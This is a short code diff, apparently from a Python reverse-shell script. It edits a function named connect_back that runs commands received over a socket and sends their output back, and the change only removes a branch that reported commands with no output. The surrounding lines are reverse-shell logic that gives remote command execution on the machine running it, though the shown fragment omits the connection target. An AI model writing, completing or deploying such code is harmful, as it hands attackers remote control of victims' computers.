@@ -40,8 +40,6 @@ def connect_back():
             result = output.stdout + output.stderr
             if result:
                 s.send(result.encode())
-            else:
-                s.send(b"[+] Command executed but no output.\n")
         except Exception as e:
             s.send(f"[-] Error: {e}\n".encode())
     s.close()
